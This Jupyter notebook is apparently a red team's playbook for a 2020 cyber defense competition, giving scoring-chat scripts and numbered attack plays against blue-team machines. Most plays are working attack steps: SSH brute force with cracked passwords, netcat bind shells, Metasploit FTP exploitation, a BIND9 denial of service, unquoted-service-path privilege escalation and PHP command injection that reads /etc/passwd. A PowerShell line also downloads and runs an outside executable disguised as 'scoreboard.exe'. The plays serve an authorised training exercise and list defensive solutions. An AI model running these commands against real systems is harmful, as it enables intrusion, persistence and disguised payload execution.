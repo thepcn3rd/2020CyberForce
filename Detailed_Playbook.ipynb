{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Detailed Red Playbook 2020 used for competition\n",
    "\n",
    "[final form almost achieved, now ordered to match the official schedule]\n",
    "\n",
    "VPN file for you blue teams are here: \n",
    "https://gitlab.com/cfc-redteam/general-redteam-2020/-/blob/master/detailed_playbook/individual_ovpn.zip\n",
    "\n",
    "Your pod lead will give you your blue team assignments. \n",
    "\n",
    "\n",
    "Your \n",
    "\n",
    "\n",
    "\n",
    "APT Secrets (Shells)\n",
    "\n",
    "https://gitlab.com/cfc-redteam/general-redteam-2020/-/blob/master/detailed_playbook/apt_only/apt_secrets.txt\n",
    "\n",
    "Dirty C2 Shells\n",
    "\n",
    "https://gitlab.com/cfc-redteam/general-redteam-2020/-/blob/master/detailed_playbook/apt_only/dirty_c2.md"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Common Libraries\n",
    "import os\n",
    "import socket\n",
    "import requests\n",
    "import subprocess\n",
    "\n",
    "## Team Variables\n",
    "plc=\"10.1.102.8\"\n",
    "hmi=\"10.1.102.9\"\n",
    "win2k12=\"10.1.102.7\"\n",
    "win2k16=\"10.1.102.6\"\n",
    "ubuntu=\"10.1.102.5\"\n",
    "\n",
    "## Lab Variables\n",
    "#win2k12=\"10.20.1.100\"\n",
    "#win2k16=\"10.20.1.101\"\n",
    "#ubuntu=\"10.20.1.102\"\n",
    "\n",
    "## Temp Variables\n",
    "#win2k12=\"127.0.0.1\"\n",
    "#win2k16=\"127.0.0.1\"\n",
    "#ubuntu=\"127.0.0.1\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Index\n",
    "<a id='index'></a>\n",
    "\n",
    "[Scan Day Friday](#scanday)\n",
    "\n",
    "[Ref500](#ref500)\n",
    "\n",
    "[Ref501](#ref501)\n",
    "\n",
    "[Ref502](#ref502)\n",
    "\n",
    "[Ref503](#ref503)\n",
    "\n",
    "[Ref504](#ref504)\n",
    "\n",
    "[Ref505](#ref505)\n",
    "\n",
    "[Ref506](#ref506)\n",
    "\n",
    "[Ref507](#ref507)\n",
    "\n",
    "[Ref508](#ref508)\n",
    "\n",
    "[Ref600](#ref600)\n",
    "\n",
    "[Ref601](#ref601)\n",
    "\n",
    "[Ref602](#ref602)\n",
    "\n",
    "[Ref603](#ref603)\n",
    "\n",
    "[Ref604](#ref604)\n",
    "\n",
    "[Ref605](#ref605)\n",
    "\n",
    "[Ref606](#ref606)\n",
    "\n",
    "[Ref607](#ref607)\n",
    "\n",
    "[Ref608](#ref608)\n",
    "\n",
    "[Ref700](#ref700)\n",
    "\n",
    "[Ref701](#ref701)\n",
    "\n",
    "[Ref702](#ref702)\n",
    "\n",
    "[Ref703](#ref703)\n",
    "\n",
    "[Ref704](#ref704)\n",
    "\n",
    "[Ref705](#ref705)\n",
    "\n",
    "[Ref706](#ref706)\n",
    "\n",
    "[Ref707](#ref707)\n",
    "\n",
    "[Ref708](#ref708)\n",
    "\n",
    "[Ref800](#ref800)\n",
    "\n",
    "[Ref801](#ref801)\n",
    "\n",
    "[Ref802](#ref802)\n",
    "\n",
    "[Ref803](#ref803)\n",
    "\n",
    "[Ref804](#ref804)\n",
    "\n",
    "[Ref805](#ref805)\n",
    "\n",
    "[Ref806](#ref806)\n",
    "\n",
    "[Ref807](#ref807)\n",
    "\n",
    "[Ref808](#ref808)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# \"Scanning\" Day on Friday: \n",
    "<a id='scanday'></a>\n",
    "This day is really more about making sure you can connect and your network is good. \n",
    "\n",
    "Get your team assignment(s) from your Pod leader and download the zip file \"general-redteam-2020/detailed_playbook/individual_ovpn.zip\". Unzip this file and you will find a list of VPN configuration files. Copy over your assigned team(s)'s corresponding files and use the following command to import them:\n",
    "\n",
    "`nmcli connection import type openvpn file blueteamxxxx__xx_x_xxx_red.ovpn`\n",
    "\n",
    "Then you can use the following commands to connect to or disconnect from a VPN, respectively:\n",
    "`nmcli connection up blueteamxxxx__xx_x_xxx_red`\n",
    "`nmcli connection up blueteamxxxx__xx_x_xxx_red`\n",
    "\n",
    "If the VPN times out, that blue team has not yet registered and set themselves up. \n",
    "\n",
    "Once connected to the VPN, you will have to check into the scoring chat and make sure it's working: \n",
    "`http://10.X.Y.5/score/index.php`\n",
    "\n",
    "If it's not working, we will contact the white team help desk to assist. \n",
    "Scripted text to cut and paste for the score chat will be given on Friday to make\n",
    "clear the rules for blue team. \n",
    "\n",
    "On this day, you can do light scanning and poking to check the state of blue team changes\n",
    "in comparison to the golden VMs in our practice range.  \n",
    "\n",
    "If there are drastic changes, then we note them and will try to account for them during\n",
    "the live competition.\n",
    "\n",
    "What you will cut-and-paste in the score chat on Friday: \n",
    "\n",
    "Hi this is your scorekeeper, are you there?\n",
    "\n",
    "------------------------\n",
    "\n",
    "Some ground rules:\n",
    "\n",
    "This score chat is strictly for assigning points for the red team portion of the competition.\n",
    "The red team is not allowed to attack or use this score chat for social engineering. \n",
    "A major difference this year from previous years is red team can only give you points and\n",
    "you will not lost points because of successful red activities. \n",
    "We're using the \"assume breach\" model, so it's expected that red will be on your systems\n",
    "and you will not be penalized for it. \n",
    "\n",
    "Instead, you will be given clear instructions on specific detection, mitigation, and recovery\n",
    "actions that will earn you points. Think about it - how can you recover from an attack \n",
    "unless it's successful? It's a chicken and egg problem. So we create the successful attack\n",
    "and will only score you based on our instructions for recovery. \n",
    "\n",
    "The red team is not allowed to overwhelm you. After each scoring event, the red team will \n",
    "stop and give you specific defensive actions to carry out for points. Red will not execute\n",
    "another attack until the timing window for the next scored event. \n",
    "\n",
    "Is that understood?\n",
    "\n",
    "------------------------\n",
    "\n",
    "All points can only be assigned through this chat. If there are other activities on your\n",
    "systems that is not communicated through chat, then those activities will not negatively\n",
    "affect your score. Remember, points can only be received if communicated through the chat.  \n",
    "\n",
    "Do not kill processes or connections unless directed through the scoring chat. Otherwise, \n",
    "you could lost opportunities to score points. \n",
    "\n",
    "At set times in the competition, the white team will inject changes to your systems\n",
    "through their white carded accounts. \n",
    "This is for the purpose of emulating a junior system administrators doing their duties.\n",
    "You are not required and discouraged from attempting to blocks these activities. \n",
    "Doing so could jeopardize your opportunities to score future points.  \n",
    "\n",
    "Is that understood?\n",
    "\n",
    "------------------------\n",
    "\n",
    "A break down of the points - There are 2400 total points possible. \n",
    "These 2400 points will be come from 36 scoring events and will be the same for all blue \n",
    "teams. For all solutions make sure to supply accompanying evidence (e.g. output of commands, etc.)\n",
    "\n",
    "There is also a pool of 100 bonus \"fun\" points that is at the discretion of the \n",
    "score keeper. This category will include trivia, silly questions (e.g. your favorite ice cream),\n",
    "sportsmanship conduct, and also some free play red activities as decided by the red team. \n",
    "\n",
    "Is that understood?\n",
    "\n",
    "[NOTE for us: we can find the bonus material on the repo from fun_trivia.txt and extra_playbook.txt]\n",
    "------------------------\n",
    "\n",
    "For each scored event, you have the opportunity to either accept or decline it. \n",
    "If we do not hear from you within 20 mins., then that event will be marked as declined\n",
    "and you will received 0 points for it. \n",
    "\n",
    "All scored events will have a hint option. If you request the hint, a 25% point deduction\n",
    "will be applied if you successfully solve the event.  \n",
    "\n",
    "If you are only able to partially solve an event, the scorekeeper can give you partial credit \n",
    "for it. \n",
    "\n",
    "For some events, you might have already patched the intended vector of the attack. In these\n",
    "cases you will be asked to provide an explanation of how you implemented your defensive\n",
    "measure. Questions will include the following: \n",
    "\n",
    "What was your technique for solving, what tools did you use, output of commands, submitting\n",
    "evidence files, questions about the technology to see if you understand the cybersecurity\n",
    "concept at play. Make sure you have the ability to take screenshots.  \n",
    "You can put your evidence in /usr/local/apache2/proof on your 10.X.Y.5 VM. \n",
    "The red team is NOT allowed to attack that directory. \n",
    "\n",
    "Please create a text file with the name \"evidence.txt\" and the content:\n",
    "\"test file for the scorekeeper\"\n",
    "\n",
    "We will test that we can retrieve this for scoring purposes. \n",
    "\n",
    "Let us know when you have created the evidence.txt file and put it in the proof directory. \n",
    "\n",
    "[ you grab with: wget http://10.X.Y.5/proof/evidence.txt]\n",
    "\n",
    "\n",
    "------------------------\n",
    "\n",
    "According to the competition rules, you are supposed to have the following ports and services\n",
    "open and running:\n",
    "\n",
    "20, 21, 22, 25, 53, 69, 80, 110, 111, 123, 135, 139, 443, 445, \n",
    "1880, 2049, 3306, 3389, 6053, 8000-8900, 10502, 49150-49160\n",
    "\n",
    "Port 110 and 10502 are required open - there was a mistake in the scoring rules given to you by white team. \n",
    "\n",
    "You're not allowed to modify the applications used for the following services and must ensure that they are functioning properly: \n",
    "\n",
    "pop3, smtp, dns, ntp, ssh, http, and ftp \n",
    "\n",
    "And the last octet of your VMs are .5-.9. \n",
    "\n",
    "\n",
    "[You can now test if that's the case, just make sure most of those ports are open is good enough]\n",
    "[The range 8000-8900 and 49150-49160 are for our bind/rev shells on game day and thus there will not be services listening on them]\n",
    "\n",
    "[If they don't have most of these ports open, you would tell them:]\n",
    "\n",
    "You have not complied to the rules and the required ports and services are not up and running. \n",
    "Please fix this now otherwise on Saturday you will not be able to score points. \n",
    "\n",
    "\n",
    "------------------------\n",
    "\n",
    "This concludes the testing portion of today. Good luck and remember to have fun\n",
    "and enjoy the competition. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Scope\n",
    "\n",
    "IP Scope for competition: only nodes .5-.9 are in scope for the competition. \n",
    "\n",
    "baked-in means that it was added to the golden image, which means blue might have removed it before competition start\n",
    "inject means it'll be added to blue VMs during the competition by the infrastructure team either through ssh auth_key or winRM\n",
    "n/a means there isn't currently a prescribe way on how to do it\n",
    "\n",
    "\n",
    "# Things to keep in mind\n",
    "1.  While most of this should be default on Kali, and thus already installed, you\n",
    "may need to run:\n",
    "```bash\n",
    "apt update;\n",
    "apt install ismtp sendemail ntp sntp sshpass crackmapexec yp-tools ncat\n",
    "```\n",
    "\n",
    "2. Many of these commands assume you are root or a privilleged user on your attacking\n",
    "machine.  It appears behaviour is inconsistent on some versions of Kali otherwise.\n",
    "\n",
    "3. You may want to run a mass find/replace on this file (or a copy) of `X.Y` with the\n",
    "middle part of your subnet."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Plays\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.500\n",
    "<a id='ref500'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "hydra: easily guess password with ssh [baked], ubuntu 18.04, medium\n",
    "\n",
    "### exploit: \n",
    "```bash\n",
    "hydra -l admin -P pwlist.txt 10.X.Y.5 -t 2 ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Execute: hydra -l admin -P additionalFiles/pwlist.txt 127.0.0.1 -t 2 ssh\n"
     ]
    }
   ],
   "source": [
    "fileLocation='additionalFiles/pwlist.txt'\n",
    "print(\"Execute: hydra -l admin -P \" + fileLocation + \" \" + ubuntu + \" -t 2 ssh\" )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "result is `cisco`\n",
    "\n",
    "If that doesn't work, try this one: \n",
    "```bash\n",
    "hydra -L hydra-users.txt -P hydra-passwords.txt -u -t 4 10.X.Y.5 ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Execute: hydra -L additionalFiles/hydra-users.txt -P additionalFiles/hydra-passwords.txt 127.0.0.1 -t 2 ssh\n"
     ]
    }
   ],
   "source": [
    "passLocation='additionalFiles/hydra-passwords.txt'\n",
    "userLocation='additionalFiles/hydra-users.txt'\n",
    "print(\"Execute: hydra -L \" + userLocation + \" -P \" + passLocation + \" \" + ubuntu + \" -t 2 ssh\" )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "result is `passwords`\n",
    "\n",
    "### solution\n",
    "logs in /var/log/auth.log will show `admin` for the first one and `scastleslb`\n",
    "\n",
    "### score chat\n",
    "> hacker able to log in with compromised account, idenitfy the account\n",
    "\n",
    "### hint\n",
    "> review ssh access log\n",
    "\n",
    "### notes\n",
    "\n",
    "this is what the log looks like:\n",
    "\n",
    "Nov 13 10:36:10 localhost sshd[767]: Failed password for admin from 10.5.1.4 port 38220 ssh2\n",
    "\n",
    "Nov 13 10:36:10 localhost sshd[769]: Failed password for admin from 10.5.1.4 port 38222 ssh2\n",
    "\n",
    "Nov 13 10:36:13 localhost sshd[767]: Failed password for admin from 10.5.1.4 port 38220 ssh2\n",
    "\n",
    "Nov 13 10:36:13 localhost sshd[769]: Failed password for admin from 10.5.1.4 port 38222 ssh2\n",
    "\n",
    "Nov 13 10:36:14 localhost sshd[767]: Failed password for admin from 10.5.1.4 port 38220 ssh2\n",
    "\n",
    "Nov 13 10:36:14 localhost sshd[769]: Failed password for admin from 10.5.1.4 port 38222 ssh2\n",
    "\n",
    "Nov 13 10:36:14 localhost sshd[767]: Accepted password for admin from 10.5.1.4 port 38220 ssh2\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.501\n",
    "<a id='ref501'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "simple bind shell [use access from prev ssh creds ..., might need open firewall rule], ubuntu, easy\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "ssh -l admin 10.X.Y.5"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ssh -l admin 127.0.0.1\n"
     ]
    }
   ],
   "source": [
    "print(\"ssh -l admin \" + ubuntu)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "cred: cisco\n",
    "\n",
    "Note: Leave connection open until the next play...\n",
    "\n",
    "They can run this on linux to start a shell\n",
    "nc -lnvp 1337 -e /bin/bash\n",
    "\n",
    "You can connect by executing:\n",
    "nc 10.X.Y.5 1337"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "nc 127.0.0.1 1337\n"
     ]
    }
   ],
   "source": [
    "print (\"nc \" + ubuntu + \" 1337\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Note: Leave connection open until the next play...\n",
    "\n",
    "```\n",
    "\n",
    "### solution\n",
    "```bash\n",
    "netstat -na\n",
    "```\n",
    "\n",
    "### score chat\n",
    "> hacker has a backdoor listener running on ubuntu, id the port number of it\n",
    "\n",
    "### score response\n",
    "> good job, feel free to kill the backdoor\n",
    "\n",
    "### hint\n",
    "> run netstat and look for strange ports that are in the LISTEN state\n",
    "\n",
    "### note \n",
    "to run, first log into ssh with admin/cisco or scastleslb/passwords\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.502\n",
    "<a id='ref502'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "tcp connection [n/a - chain this after hydra play], ubuntu 18.04, easy\n",
    "plus asking for a white listed shell\n",
    "\n",
    "Note: This depends on the previous plays SSH connection or a bind shell\n",
    "\n",
    "### score chat\n",
    "> ID the current established connection used by the hacker on ubuntu .5\n",
    "\n",
    "### chat response\n",
    "if they ID the right connection (port 22)\n",
    "> that is the right connect, you can now kill that connection. \n",
    "\n",
    "> good job, we will no longer test your ability to kill shell connections\"\n",
    "Follow up: \n",
    "> In order for us to carry out the rest of the scored events, we will need a working shell connection. \n",
    "> On the honor system, we will only use this shell to verify your mitigations and to stage future events so you can get points. \n",
    "> This shell will be using port 8111. Please do not kill it. Will this be okay with you? \n",
    "\n",
    "If they allow then run commands in notes to get your 8111 shell. \n",
    "> Thanks, you just earned 10 bonus points for sportsmenship, Good job!\n",
    "\n",
    "### hint\n",
    "run netstat and look for strange established connections\n",
    "\n",
    "### notes\n",
    "This connect is the ssh one from the hydra play\n",
    "\n",
    "Ask them for netstat results or something similar\n",
    "\n",
    "If they allow us to use our 8111 shell, then on .5:\n",
    "\n",
    "ssh into .5 with admin/cisco\n",
    "\n",
    "/usr/bin/ruby --ssl -lp 8111 -e /bin/bash\n",
    "\n",
    "kali: ncat --ssl 10.X.Y.5 8111"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ncat --ssl 127.0.0.1 8111\n"
     ]
    }
   ],
   "source": [
    "print(\"ncat --ssl \" + ubuntu + \" 8111\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "whoami\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.503\n",
    "<a id='ref503'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "EasyFTP 1.7.0.11 exploit [baked], win2012, medium\n",
    "\n",
    "### notes\n",
    "*NOTE/WARNING*: You get one shot at this, as the exploit kills the process...\n",
    "Also, remember you should be root to run `msfconsole`.\n",
    "\n",
    "### exploit\n",
    "\n",
    "```bash\n",
    "cat > easyftp_exploit.rc << EOF\n",
    "use exploit/windows/ftp/easyftp_cwd_fixret\n",
    "set RHOSTS 10.X.Y.7\n",
    "set PAYLOAD windows/meterpreter/bind_tcp\n",
    "set TARGET 9\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "# This script creates the easyftp.rc file for metasploit to use\n",
    "# IF PORT 4444 is already open, change the port number below\n",
    "port=4444\n",
    "f = open('additionalFiles/easyftp.rc', 'w')\n",
    "f.write(\"use exploit/windows/ftp/easyftp_cwd_fixret\")\n",
    "f.write(\"set RHOSTS \" + win2k12)\n",
    "f.write(\"set PAYLOAD windows/meterpreter/bind_tcp\")\n",
    "f.write(\"set LPORT \" + str(port))\n",
    "f.write(\"set TARGET 9\")\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the directory of the jupyter playbook run command: \n",
    "msfconsole -r additionalFiles/easyftp_exploit.rc"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```\n",
    "Check whatever settings/options you want then execute `run`.\n",
    "\n",
    "Since one shot (and you want it for future right?), at the meterpreter prompt:\n",
    "```bash\n",
    "migrate -N winlogon.exe\n",
    "shell\n",
    "sc start jumpftp\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once you have  a meterpreter shell on the target system. You can run this payload before exiting. This will allow the DirtyC2 team to give you access further down the road. \n",
    "\n",
    "NOTE This will cause your meterpreter sessions do die, so please run this as the last set of commands.\n",
    "\n",
    "powershell -command (new-object net.webclient).DownloadFile('https://www.mavka-lookup.info/static/downloads/mavka_win.exe','scoreboard.exe')\n",
    "\n",
    "powershell -command (.\\scoreboard.exe)\n",
    "\n",
    "```\n",
    "exit\n",
    "```\n",
    "\n",
    "*NOTE*: Some testers experienced a disconnect after ~3 commands, others did not.\n",
    "\n",
    "### solution\n",
    "The FTP server was exploited and crashed/restarted. They should not kill this shell. \n",
    "\n",
    "### score chat\n",
    "> Hackers got into the system, find out how.  Also, did a service restart?\n",
    "\n",
    "### hint\n",
    "> Check the event log for application events, like APPCRASH events with IDs 1000 and 1001.\n",
    "\n",
    "### note \n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.504\n",
    "<a id='ref504'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title: \n",
    "BIND9 tkey DoS [baked], win2016, easy [combo with next play]\n",
    "\n",
    "### exploit\n",
    "metasploit `auxiliary/dos/dns/bind_tkey` configured with rport `6053`\n",
    "\n",
    "```bash\n",
    "msfconsole\n",
    "use auxiliary/dos/dns/bind_tkey\n",
    "set rhost 10.X.Y.6\n",
    "set rport 6053\n",
    "run\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "port=6053\n",
    "f = open('additionalFiles/tkey.rc', 'w')\n",
    "f.write(\"use auxiliary/dos/dns/bind_tkey\")\n",
    "f.write(\"set RHOSTS \" + win2k16)\n",
    "f.write(\"set RPORT \" + str(port))\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the directory of the jupyter playbook run command: msfconsole -r additionalFiles/tkey.rc\n",
    "\n",
    "### solution\n",
    "The service name is `named` with an alias of `ISC BIND`.\n",
    "\n",
    "### score chat\n",
    "> identify the service that was taken down on win2016 and restart it\n",
    "\n",
    "### hint\n",
    "> review the required services running on this machine.\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.505\n",
    "<a id='ref505'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "Bind9 Unquoted Service Path Privilege Escalation [inject], win2016, medium\n",
    "[combo with prev. play]\n",
    "tbd: need mechanism to upload, hopefully c2 team maybe\n",
    "\n",
    "### note\n",
    "*NOTE*: This is in combination with the next (BIND9 tkey DoS) exploit.  That is, you stage\n",
    "this, run the DoS, and then get a shell via this (when/if they restart the service).\n",
    "\n",
    "### exploit\n",
    "As `root` (or privilleged user),\n",
    "```bash\n",
    "msfvenom -p windows/x64/meterpreter/bind_tcp lport=8123 -f exe-service > ISC.exe\n",
    "```\n",
    "Upload the executable to `C:\\Program Files\\` on 10.X.Y.6\n",
    "May want to check from a `cmd.exe` shell that `sc qc named` returns a value of\n",
    "`C:\\Program Files\\ISC BIND 9\\bin\\named.exe` (note there are no quotes) for the\n",
    "`BINARY_PATH_NAME` option otherwise this chain will not work.\n",
    "GOTO the next (BIND9 tkey DoS) exploit to cause the service to crash before attempting\n",
    "to connect to the shell in the next step (i.e., they have to restart the service with\n",
    "our custom payload).\n",
    "Attempt to use `msfconsole` `mutli/handler` to connect to port `8123` (when the service is\n",
    "restarted).\n",
    "```bash\n",
    "msfconsole\n",
    "use exploit/multi/handler\n",
    "set payload windows/x64/meterpreter/bind_tcp\n",
    "set rhost 10.5.0.6\n",
    "set lport 8123\n",
    "run\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "port=8123\n",
    "f = open('additionalFiles/named.rc', 'w')\n",
    "f.write(\"use exploit/multi/handler\")\n",
    "f.write(\"set payload windows/x64/meterpreter/bind_tcp\")\n",
    "f.write(\"set RHOSTS \" + win2k16)\n",
    "f.write(\"set RPORT \" + str(port))\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "From the directory of the jupyter playbook run command: msfconsole -r additionalFiles/named.rc\n",
    "\n",
    "### solution\n",
    "The `named` service path needs to be changed to `\"C:\\Program Files\\ISC BIND 9\\bin\\named.exe\"`.\n",
    "Pay attention to the quotes, as it currently is not quoted (which allows this to work).\n",
    "*NOTE*: File deletion does not mitigate the *vector*.\n",
    "\n",
    "### score chat\n",
    "> A backdoor was executed on Win2016, explain and mitigate the vector used by the attacker\n",
    "\n",
    "### hint\n",
    "> the backdoor is using port `8123`\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.506\n",
    "<a id='ref506'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "php remote code execution [inject], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "After the white team inject for this, the web page `http://10.X.Y.5/index.php`\n",
    "should allow `http://10.X.Y.5/index.php?tz=Denver` (or any valid timezone\n",
    "value, e.g. New_York).\n",
    "However, the updated code also allows exploitation as such,\n",
    "`http://10.X.Y.5/index.php?tz=Denver%22%27;%20cat%20/etc/passwd%20%23`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "URL: http://127.0.0.1/index.php?tz=Denver%22%27;%20cat%20/etc/passwd%20%23\n",
      "Exfiltration was successful.\n",
      "<html>\n",
      "<body>\n",
      "\n",
      "Fri Nov 13 02:00:00 EST 2020\n",
      "root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n",
      "tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false\n",
      "strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin\n",
      "ntp:x:107:112::/nonexistent:/usr/sbin/nologin\n",
      "messagebus:x:108:113::/nonexistent:/usr/sbin/nologin\n",
      "redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin\n",
      "rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin\n",
      "iodine:x:111:65534::/var/run/iodine:/usr/sbin/nologin\n",
      "miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\n",
      "dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n",
      "usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n",
      "tcpdump:x:115:119::/nonexistent:/usr/sbin/nologin\n",
      "rtkit:x:116:121:RealtimeKit,,,:/proc:/usr/sbin/nologin\n",
      "_rpc:x:117:65534::/run/rpcbind:/usr/sbin/nologin\n",
      "Debian-snmp:x:118:123::/var/lib/snmp:/bin/false\n",
      "statd:x:119:65534::/var/lib/nfs:/usr/sbin/nologin\n",
      "postgres:x:120:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n",
      "stunnel4:x:121:127::/var/run/stunnel4:/usr/sbin/nologin\n",
      "sshd:x:122:65534::/run/sshd:/usr/sbin/nologin\n",
      "sslh:x:123:128::/nonexistent:/usr/sbin/nologin\n",
      "avahi:x:124:129:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\n",
      "nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n",
      "nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n",
      "pulse:x:127:133:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\n",
      "saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n",
      "inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin\n",
      "colord:x:130:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:131:139::/var/lib/geoclue:/usr/sbin/nologin\n",
      "lightdm:x:132:140:Light Display Manager:/var/lib/lightdm:/bin/false\n",
      "king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "kali:x:1000:1000:Kali,,,:/home/kali:/bin/bash\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "\n",
      "</body>\n",
      "</html>\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "url = \"http://\" + ubuntu + \"/index.php?tz=Denver%22%27;%20cat%20/etc/passwd%20%23\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"Exfiltration was successful.\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"Exfiltration failed\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
